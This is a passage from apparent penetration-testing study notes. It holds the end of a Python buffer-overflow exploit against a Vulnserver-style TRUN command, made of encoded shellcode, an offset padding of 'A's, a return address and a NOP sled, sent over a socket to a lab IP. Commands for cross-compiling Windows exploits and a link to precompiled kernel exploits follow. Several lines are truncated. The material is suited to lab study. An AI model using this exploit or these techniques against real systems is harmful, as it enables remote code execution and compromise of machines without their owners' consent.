"\x27\x5e\xcd\xe6\x45\x77\xe2\x4f\xe3\xa1\xcd\x5>
"\xd3\xa3\xc6\xae\xea\x6b\x1b\xaf\x2b\x91\xd6\xf>
"\x11\x80\xa8\x55\x9a\xda\x3d\xde\x7f\xaa\x3c\xc>
"\xcf\xd1\x65\x13\x46\xc9\x6a\x1e\x10\x62\x58\xd>
"\x15\x0f\x8b\x1c\xe4\x51\xcc\x9b\x17\x24\x24\xd>
"\xa2\x70\xb5\xe7\x05\xf2\x6d\xc3\xb4\xd7\xe8\x8>
"\xce\xdf\x23\x53\x65\xdb\xa8\x52\xa9\x6d\xea\x7>
"\x19\x34\x93\x1f\x25\x26\x7c\xff\x83\x2d\x91\x1>
"\xd9\xf3\x8e\xfe\x75\x83\xfd\xcc\xda\x3f\x69\x7>
"\x82\x89\x5e\xe0\x7d\x32\x9f\x29\xba\x66\xcf\x4>
"\x91\x94\xd2\x0b\xc1\x3a\x8d\xeb\xb1\xfa\x7d\x8>
"\xb4\xe4\xde\xca\x5f\x1f\x89\x34\x37\x1e\x25\xd>
"\x41\xc2\xc6\xac\x69\x82\x51\x59\x13\x8f\x29\xf>
"\x3a\x56\xaa\xa9\xf5\x9f\xc7\xb9\x62\x50\x92\xe>
"\x8b\xaa\xe2\xd7\x4b\xa4\x1e\x40\x1c\xe1\xd1\x9>
"\x30\xee\xdd\x0d\x7b\xaa\x39\xee\x82\x33\xcf\x4>
"\x52\xed\x17\xc5\x05\xbb\xc1\xa3\xff\x0d\xbb\x7>
"\xfb\x9f\xd7\x2d\x04\xca\xa1\xd1\xb5\xa3\xf7\xe>
"\x97\x66\xd4\xff\x42\x23\xf4\x1d\x46\x5e\x9d\xb>
"\x3b\xfe\x20\xfd\xbf\x0a\xd9\xfa\xa0\x7f\xdc\x4>
"\xd8\x02\x92\x03\xd8\x06")

shellcode = "A"*2003 + "\xaf\x11\x50\x62" +"\x90"*32 +overflow


try:
                s=socket.socket(socket.AF_INET,s>
                s.connect(('192.168.1.110',9999))

                s.send(('TRUN /.:/'+ shellcode))
                s.close()

except:
                print "Error Connecting"
                sys.exit()



```

## compiling exploits

- compiling windows exploits

```
i686-w64-mingw32-gcc exploit.c -o exploit
```

- for 32 bit

```
i686-w64-mingw32-gcc 40564.c -o 40564 -lws2_32
```
- [precompiled windows-kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)
